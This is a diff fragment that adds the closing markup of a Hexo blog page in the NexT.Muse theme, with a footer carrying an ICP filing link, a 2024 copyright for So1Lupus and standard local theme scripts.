+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2022029346号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">So1Lupus</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
